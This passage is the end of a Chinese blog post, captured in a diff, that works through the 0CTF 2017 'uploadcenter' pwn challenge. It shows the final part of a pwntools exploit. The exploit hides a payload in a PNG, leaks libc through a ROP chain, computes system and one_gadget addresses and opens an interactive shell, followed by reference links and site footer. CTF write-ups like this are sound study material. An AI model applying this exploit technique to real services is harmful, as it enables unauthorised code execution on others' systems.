+	<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">cond</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">mutex</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+	<span class="n">payload</span><span class="o">+=</span><span class="n">ropchain</span>
+	<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100000</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+	<span class="n">add_png</span><span class="p">(</span><span class="mi">1024</span><span class="p">,</span><span class="mi">1024</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">ropchain</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span>\
+		 <span class="n">p64</span><span class="p">(</span><span class="n">mutex</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">mutex_unlock</span><span class="p">)</span><span class="o">+</span>\
+		 <span class="n">p64</span><span class="p">(</span><span class="n">rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">60</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sleep</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">(</span><span class="n">ropchain</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+<span class="c1">#leak libc</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;data</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">puts_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="nb">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
+<span class="n">system</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+<span class="n">bin_sh</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+<span class="n">one_gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4526a</span>
+<span class="c1">#get shell</span>
+<span class="n">ropchain</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span>
+<span class="n">rop</span><span class="p">(</span><span class="n">ropchain</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="参考">参考</h1>
+<p><a href="https://blog.csdn.net/bisword/article/details/2777121" target="_blank" rel="noopener noreffer">PNG文件结构</a></p>
+<p><a href="https://www.ibm.com/developerworks/cn/linux/thread/posix_thread2/index.html" target="_blank" rel="noopener noreffer">线程互锁</a></p>
+<p><a href="https://www.ibm.com/developerworks/cn/linux/thread/posix_thread3/index.html" target="_blank" rel="noopener noreffer">线程信号</a></p>
+<p><a href="https://blog.csdn.net/elfprincexu/article/details/78779158" target="_blank" rel="noopener noreffer">线程栈</a></p>
+<p><a href="http://tukan.farm/2016/07/27/munmap-madness/" target="_blank" rel="noopener noreffer">mmap分配</a></p>
+<p><a href="https://blog.dragonsector.pl/2017/03/0ctf-2017-uploadcenter-pwn-523.html" target="_blank" rel="noopener noreffer">Dragon sector</a></p>
+<p><a href="https://kt.gy/blog/2017/03/0ctf-2017-quals-uploadcenter/" target="_blank" rel="noopener noreffer">Tamás Koczka</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-05-13</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/0ctf-uploadcenter/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://example.org/0ctf-uploadcenter/" data-title="0CTF uploadcenter" data-via="xx" data-hashtags="pwn,wp"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://example.org/0ctf-uploadcenter/" data-hashtag="pwn"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://example.org/0ctf-uploadcenter/" data-title="0CTF uploadcenter" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://example.org/0ctf-uploadcenter/" data-title="0CTF uploadcenter"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://example.org/0ctf-uploadcenter/" data-title="0CTF uploadcenter"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://example.org/0ctf-uploadcenter/" data-title="0CTF uploadcenter" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://example.org/0ctf-uploadcenter/" data-title="0CTF uploadcenter" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://example.org/0ctf-uploadcenter/" data-title="0CTF uploadcenter"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/wp/">wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/kernel%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF-%E4%BA%8C/" class="prev" rel="prev" title="kernel学习之路(二)"><i class="fas fa-angle-left fa-fw"></i>kernel学习之路(二)</a>
+            <a href="/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACglibc%E7%9A%84%E5%A0%86%E7%AE%A1%E7%90%86%E5%92%8C%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" class="next" rel="next" title="不同版本glibc的堆管理和新增保护机制">不同版本glibc的堆管理和新增保护机制<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Luexp</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
